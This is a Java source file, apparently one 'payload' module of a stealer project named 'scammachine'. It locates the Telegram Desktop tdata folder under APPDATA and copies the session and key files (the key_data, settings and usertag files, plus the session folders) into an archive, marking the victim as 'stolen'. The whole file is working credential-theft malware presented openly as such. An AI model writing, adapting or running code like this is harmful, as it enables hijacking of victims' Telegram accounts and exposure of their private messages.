package me.teejayx6.scammachine.payloadz;

import me.teejayx6.scammachine.util.ArchiveUtil;
import me.teejayx6.scammachine.util.FileUtils;
import me.teejayx6.scammachine.util.TempFile;

import java.io.File;

public class Telegram
{
    public static boolean stolen = false;

    public static void execute()
    {
        String appdata = System.getenv("APPDATA");
        if (!appdata.endsWith("\\"))
            appdata += "\\";

        String path = appdata + "Telegram Desktop\\tdata";
        File file = new File(path);

        if (file.exists() && file.isDirectory())
        {
            File[] folder = file.listFiles();
            if (folder != null)
            {
                for (File f : folder)
                {
                    if (f.isDirectory())
                    {
                        if (f.getName().length() == 16)
                        {
                            for (File f2 : f.listFiles())
                            {
                                try
                                {
                                    TempFile tmp = FileUtils.readFile(f2.getAbsolutePath());
                                    if (tmp != null)
                                    {
                                        stolen = true;
                                        ArchiveUtil.addFile("Telegram/" + f.getName() + "/" + f2.getName(), tmp.bytes);
                                        FileUtils.close(tmp);
                                    }
                                }
                                catch (Exception e)
                                {

                                }
                            }
                        }
                    }
                    else
                    {
                        if (f.length() <= 5120)
                        {
                            if (f.getName().endsWith("s") && f.getName().length() == 17)
                            {
                                try
                                {
                                    TempFile tmp = FileUtils.readFile(f.getAbsolutePath());
                                    if (tmp != null)
                                    {
                                        stolen = true;
                                        ArchiveUtil.addFile("Telegram/" + f.getName(), tmp.bytes);
                                        FileUtils.close(tmp);
                                    }
                                }
                                catch (Exception e)
                                {

                                }
                            }
                            else
                            {
                                if (f.getName().startsWith("usertag") || f.getName().startsWith("settings") || f.getName().startsWith("key_data"))
                                {
                                    try
                                    {
                                        TempFile tmp = FileUtils.readFile(f.getAbsolutePath());
                                        if (tmp != null)
                                        {
                                            stolen = true;
                                            ArchiveUtil.addFile("Telegram/" + f.getName(), tmp.bytes);
                                            FileUtils.close(tmp);
                                        }
                                    }
                                    catch (Exception e)
                                    {

                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
